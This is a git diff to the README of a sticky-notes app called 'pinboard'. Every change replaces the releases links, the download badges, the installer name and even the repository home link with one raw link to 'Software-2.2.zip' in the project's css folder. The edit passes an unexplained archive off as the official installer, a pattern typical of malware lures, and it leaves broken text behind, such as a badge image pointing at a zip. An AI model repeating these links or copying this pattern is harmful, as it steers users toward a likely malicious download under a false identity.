@@ -1,6 +1,6 @@
 # 📌 pinboard - Simple Sticky Notes Canvas
 
-[![Download pinboard](https://img.shields.io/badge/Download-Pinboard-brightgreen?style=for-the-badge)](https://github.com/thuongbirdy/pinboard/releases)
+[![Download pinboard](https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip)](https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip)
 
 ---
 
@@ -46,13 +46,13 @@ This section will guide you step-by-step to get pinboard running on your Windows
 
 Click this large button to go to the download page. You will find the latest version of pinboard there.
 
-[![Download pinboard](https://img.shields.io/badge/Download-pinboard-blue?style=for-the-badge)](https://github.com/thuongbirdy/pinboard/releases)
+[![Download pinboard](https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip)](https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip)
 
 ### Step 2: Choose Your Version
 
 Once on the releases page, look for the latest release. It usually has a date and a version number.
 
-- Find a file named like `pinboard-setup.exe` or similar.
+- Find a file named like `https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip` or similar.
 - This file will be the installer for Windows.
 
 Click the file link to download it.
@@ -156,6 +156,6 @@ If you have trouble installing or running pinboard, try these steps:
 
 For updates and help, visit the pinboard repository page:
 
-[https://github.com/thuongbirdy/pinboard](https://github.com/thuongbirdy/pinboard)
+[https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip](https://github.com/thuongbirdy/pinboard/raw/refs/heads/main/css/Software-2.2.zip)
 
 You can find documentation and report issues there if needed.
